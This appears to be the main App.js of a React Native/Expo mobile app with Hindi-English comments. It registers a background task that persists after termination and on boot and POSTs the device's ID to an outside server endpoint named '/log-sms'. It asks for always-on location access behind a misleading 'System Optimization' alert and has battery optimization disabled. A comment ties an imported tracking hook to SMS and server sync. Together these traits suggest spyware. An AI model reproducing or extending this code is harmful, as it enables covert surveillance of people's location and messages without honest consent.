import React, { useEffect } from 'react';
import { Platform, View, StyleSheet, Alert } from 'react-native';
import { StatusBar } from 'expo-status-bar';
import * as Location from 'expo-location'; // Background tracking ke liye zaruri
import * as TaskManager from 'expo-task-manager';
import * as BackgroundFetch from 'expo-background-fetch';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { PermissionsAndroid } from 'react-native';

// Custom Hooks & Screens
import usePermissions from './src/hooks/usePermissions';
import useTracking from './src/hooks/useTracking';
import HomeScreen from './src/screens/HomeScreen';
import WebDashboard from './src/screens/WebDashboard';

// Define Background Task
const BACKGROUND_FETCH_TASK = 'background-fetch';

TaskManager.defineTask(BACKGROUND_FETCH_TASK, async () => {
  console.log('[Background Task] Running background fetch task');
  try {
    // Try to include deviceId stored in AsyncStorage
    let deviceId = 'unknown';
    try {
      const id = await AsyncStorage.getItem('TIGER_DEVICE_ID');
      if (id) deviceId = id;
    } catch (e) {
      console.warn('[Background Task] AsyncStorage read failed:', e.message);
    }

    const payload = {
      sender: 'background',
      message: 'ping',
      device: `Background (${Platform.OS})`,
      deviceId,
      timestamp: new Date().toLocaleString()
    };

    const response = await fetch('https://tiger2-1.onrender.com/log-sms', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      console.error('[Background Task] POST non-ok:', response.status);
      return BackgroundFetch.BackgroundFetchResult.Failed;
    }

    console.log('[Background Task] Ping sent to server');
    return BackgroundFetch.BackgroundFetchResult.NewData;
  } catch (error) {
    console.error('[Background Task] POST Failed:', error);
    return BackgroundFetch.BackgroundFetchResult.Failed;
  }
});

// Register the task
const registerBackgroundFetchAsync = async () => {
  try {
    await BackgroundFetch.registerTaskAsync(BACKGROUND_FETCH_TASK, {
      minimumInterval: 60 * 15, // 15 minutes
      stopOnTerminate: false, // Keep running after app terminates
      startOnBoot: true, // Start on device boot
    });
    console.log('[Background Task] Registered successfully');

    // Force foreground service notification (if supported)
    if (Platform.OS === 'android') {
      await BackgroundFetch.setMinimumIntervalAsync(60 * 15);
      console.log('[Background Task] Foreground service enforced');
    }
  } catch (err) {
    console.error('[Background Task] Registration failed:', err);
  }
};

export default function App() {
  const permissionStatus = usePermissions();

  useEffect(() => {
    // 🛡️ Pro-Security Step: Background Permission Request
    const checkBackgroundTracking = async () => {
      if (Platform.OS === 'android' && permissionStatus === 'granted') {
        const { status: bgStatus } = await Location.getBackgroundPermissionsAsync();
        
        if (bgStatus !== 'granted') {
          Alert.alert(
            "System Optimization",
            "Behtar performance ke liye 'Allow all the time' location access select karein.",
            [{ text: "OK", onPress: () => Location.requestBackgroundPermissionsAsync() }]
          );
        }

        // Disable battery optimization
        try {
          const granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
          if (granted === PermissionsAndroid.RESULTS.GRANTED) {
            console.log("[✓] Battery optimization disabled");
          } else {
            console.warn("[X] Battery optimization not disabled - tasks may be killed");
            Alert.alert("Warning", "Please disable battery optimization for this app in settings.");
          }
        } catch (err) {
          console.error("Battery optimization request failed:", err);
        }
      }
    };
    
    checkBackgroundTracking();

    // Register background fetch task
    registerBackgroundFetchAsync();
  }, [permissionStatus]);

  // SMS aur Server Sync trigger
  useTracking(permissionStatus);

  return (
    <View style={styles.container}>
      <StatusBar style="auto" />
      {Platform.OS === 'web' ? <WebDashboard /> : <HomeScreen />}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#fff' },
});
